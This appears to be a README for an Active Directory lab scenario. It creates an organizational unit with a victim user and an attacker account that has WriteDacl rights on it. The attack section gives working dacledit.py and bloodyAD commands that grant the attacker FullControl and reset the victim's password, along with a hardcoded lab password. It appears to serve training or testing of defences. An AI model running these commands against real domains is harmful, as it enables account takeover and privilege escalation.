# acl-writedacl-ou

Creates the OU `scn-acl-wdo` (not protected from accidental deletion) with user `scn-acl-wdo-victim` inside, and gives `scn-acl-wdo-attacker` (password `Aa1234567890!`) `WriteDacl` on the OU.

Attack:

    dacledit.py -action write -rights FullControl -inheritance -principal scn-acl-wdo-attacker -target-dn 'OU=scn-acl-wdo,<domain DN>' <domain>/scn-acl-wdo-attacker:'Aa1234567890!' -dc-ip <dc ip>
    bloodyAD -d <domain> -u scn-acl-wdo-attacker -p 'Aa1234567890!' --host <dc ip> set password scn-acl-wdo-victim 'NewPassw0rd!'

How to verify:

    dacledit.py -action read -principal scn-acl-wdo-attacker -target-dn 'OU=scn-acl-wdo,<domain DN>' <domain>/scn-acl-wdo-attacker:'Aa1234567890!' -dc-ip <dc ip>

Disable deletes the OU recursively (victim included, the ACE goes with it) and the attacker.
